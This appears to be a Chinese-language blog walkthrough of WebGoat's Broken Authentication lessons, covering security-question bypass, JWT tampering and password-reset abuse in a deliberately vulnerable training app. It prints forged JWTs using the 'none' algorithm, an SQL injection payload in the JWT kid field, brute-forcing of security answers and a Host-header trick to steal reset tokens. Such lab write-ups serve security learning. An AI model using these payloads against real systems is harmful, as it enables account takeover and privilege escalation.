# 原创
：  【webGoat】Broken Authentication

# 【webGoat】Broken Authentication

**目录**

[Broken Authentication（中断的身份验证）](#_authentication_bypasses)

[一、Authentication Bypasses（绕过身份验证）](#_authentication_bypasses)

[第2题：](#%E7%AC%AC2%E9%A2%98%EF%BC%9A)

[二、JWT tokens](#lesson-title)

[第3题：](#%E7%AC%AC3%E9%A2%98%EF%BC%9A)

[第5题：](#%E7%AC%AC5%E9%A2%98%EF%BC%9A)

[第7题：](#%E7%AC%AC7%E9%A2%98%EF%BC%9A)

[第8题：](#%E7%AC%AC8%E9%A2%98%EF%BC%9A)

[第10题：](#%E7%AC%AC10%E9%A2%98%EF%BC%9A)

[第11题：](#%E7%AC%AC11%E9%A2%98%EF%BC%9A)

[三、Password reset（密码重置）](#lesson-title)

[启动webwolf](#%E5%90%AF%E5%8A%A8webwolf)

[第2题：](#%E7%AC%AC%E4%BA%8C%E9%A2%98%EF%BC%9A)

[第4题：](#%E7%AC%AC4%E9%A2%98%EF%BC%9A)

[第5题：](#%E7%AC%AC5%E9%A2%98%EF%BC%9A)

[第6题： ](#%E7%AC%AC6%E9%A2%98%EF%BC%9A%C2%A0)

---


## Broken Authentication（中断的身份验证）

> 
<h3>一、Authentication Bypasses（绕过身份验证）</h3>
<h4>第2题：</h4>
随便提交，然后抓到包
发送到repeater进行研究


secQuestion0和secQuestion1
如果改为2，3的话（任何可能不存在的），没有对应的问题和答案
可能输入null=null，或者输入什么都是对的
改后返回数据包为true

 <img alt="" height="339" src="https://img-blog.csdnimg.cn/bf4ac01ea5994435bd2154eaf63db246.png" width="1200"/>



> 
<h3>二、JWT tokens</h3>
<h4>第3题：</h4>
直接使用JWT在线解密工具
用户名为
user



<hr/>
<hr/>
<h4>第5题：</h4>
这个垃圾桶是重置的意思

 <img alt="" height="142" src="https://img-blog.csdnimg.cn/463a52a3a8634084a3deeb0d9261929a.png" width="1200"/>
想尝试2个方法
1、通过切换用户，将其他用户的权限通过JWT提升为admin（失败）
2、执行删除操作，以admin权限进行 （成功）
<hr/>
方法一（失败）
点击切换为角色Tom
并抓包，其中一个包中发现了token



 JWT解密后
"admin": "false",要将其改为true
避免爆破，直接将其改为{ “alg”: “none”}


base64编码：
{
"alg": "none"<br/> }
为
ewoKImFsZyI6ICJub25lIgp9

{<br/> "iat": 1665554118,<br/> "admin": "true",<br/> "user": "Tom"<br/> }
为
ewoiaWF0IjogMTY2NTU1NDExOCwKImFkbWluIjogInRydWUiLAoidXNlciI6ICJUb20iCn0=

(提示：编码时，别带空格，不然最后会这样) 
组合(要去掉=，还要加.)：
ewoKImFsZyI6ICJub25lIgp9.ewoiaWF0IjogMTY2NTU1NDExOCwKImFkbWluIjogInRydWUiLAoidXNlciI6ICJUb20iCn0.

只改JWT，失败

 头部删掉后，但还是失败


<hr/>
方法二（成功）
点击垃圾箱，并抓包，改JWT
ewrCoCAiYWxnIjogIm5vbmUiCn0.ewogICJpYXQiOiAxNjY1NTU0MTE4LAogICJhZG1pbiI6ICJ0cnVlIiwKICAidXNlciI6ICJUb20iCn0.

 然后这题就绿了，完成了
<hr/>
<hr/>

<h4>第7题：</h4>


<hr/>
<hr/>
<h4>第8题：</h4>
爆破密钥
<hr/>
<hr/>
<h4>第10题：</h4>
题意为：自己买东西，让Tom支付
根据提示找到已经失效的token

 <img alt="" height="236" src="https://img-blog.csdnimg.cn/0812cd5bd5734c9aad59e6eece602ddc.png" width="1200"/>
<pre>eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q</pre>
 <img alt="" height="713" src="https://img-blog.csdnimg.cn/25e25766a2c04d93ae971b257b2b7674.png" width="1200"/>

加密方法改为none
base64编码：
{
"alg": "none"<br/> }
为
ewoKImFsZyI6ICJub25lIgp9

exp是时间戳，在这个基础上推迟几十秒
1664698210（这位结束时间，最好在现在的后面2分钟）
我这里是过关后截图的



base64加密
{<br/> "iat": 1526131411,<br/> "exp": 1664698210,<br/> "admin": "false",<br/> "user": "Tom"<br/> }
为
ewoiaWF0IjogMTUyNjEzMTQxMSwKImV4cCI6IDE2NjQ2OTgyMTAsCiJhZG1pbiI6ICJmYWxzZSIsCiJ1c2VyIjogIlRvbSIKfQ==

组合起来（删除=，加上.）
ewoKImFsZyI6ICJub25lIgp9.ewoiaWF0IjogMTUyNjEzMTQxMSwKImV4cCI6IDE2NjQ2OTgyMTAsCiJhZG1pbiI6ICJmYWxzZSIsCiJ1c2VyIjogIlRvbSIKfQ.

点击checkout后，抓到数据包
发送到repeater


将JWT插入到Authorization后面部分

 <img alt="" height="300" src="https://img-blog.csdnimg.cn/e04ddd6edf324dffb2020ae2f7830319.png" width="1200"/>

<hr/>
<hr/>
<h4>第11题：</h4>
（参考的大佬的方法）
点击，删除Tom，抓包
并发送到repeater


eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiSmVycnkiLCJFbWFpbCI6ImplcnJ5QHdlYmdvYXQuY29tIiwiUm9sZSI6WyJDYXQiXX0.CgZ27DzgVW8gzc0n6izOU638uUCi6UhiOJKYzoEZGE8



1、kid没有防御SQL注入，存在注入点
'; select 'MQ==' from jwt_keys --


2、改变username
Tom


3、改时间戳
1618905304改为现在以后的时间戳
1664703610


3、SQL注入查询的结果会作为签名算法的秘钥来对header和payload进行加密
1




将改后的JWT填上去返回true了

 <img alt="" height="691" src="https://img-blog.csdnimg.cn/0fe8526f46404c9aae08e90a39d5a3ca.png" width="823"/>



---


#### 第5题：

---


---


---


#### 第8题：

---


---


#### 第11题：

> 
<h3>三、Password reset（密码重置）</h3>
<h4>启动webwolf</h4>
webwolf出点问题了（在powershell下，解决方法好像是需要将编码方法引起来）

 java -Dfile.encoding=UTF-8 -jar webwolf-8.2.2.jar
（在管理员命令提示符下成功了）

点击进行启动webwolf页面
并使用webGoat账号进行登陆


<hr/>
<hr/>
<h4>第2题：</h4>
测试webwolf是否可用
使用自己的用户名+@webgoat.org


 收到了新密码<img alt="" height="634" src="https://img-blog.csdnimg.cn/3374b5ded56a4c57a234bce23e6de592.png" width="1200"/>
新密码登陆
 <img alt="" height="395" src="https://img-blog.csdnimg.cn/05cf654c14a1461ea498a50baada4aaa.png" width="628"/>
 <img alt="" height="413" src="https://img-blog.csdnimg.cn/3349fb47de664ddbbcead21ccb6acb4a.png" width="800"/>


<hr/>
<hr/>
<h4>第4题：</h4>
会提示用户是否存在
然后对存在的用户进行爆破
（颜色可能是英文，可能是中文）



爆破就那些个颜色，没啥难搞的
tom
purple
<hr/>
<hr/>
<h4>第5题：</h4>

<hr/>
<hr/>
<h4>第6题： </h4>
先尝试重置自己的密码

 点击link

fcc02a5f-2c90-4178-974f-048ed485640c可能是身份


 尝试修改Tom密码
再发送邮件


抓包，并发送到repeater


修改Host访问本地的webwolf发邮件


webwolf抓到链接
复制后面的身份验证凭证
（替换重置自己身份的那个URL的身份信息）


<pre>9112825a-e642-4eaa-96ad-233e422696cb</pre>




 <img alt="" height="263" src="https://img-blog.csdnimg.cn/2ed6ec13994447d78f1533449ed23d40.png" width="940"/>
 登陆成功




---


#### 第2题：

---


---


#### 第5题：

---

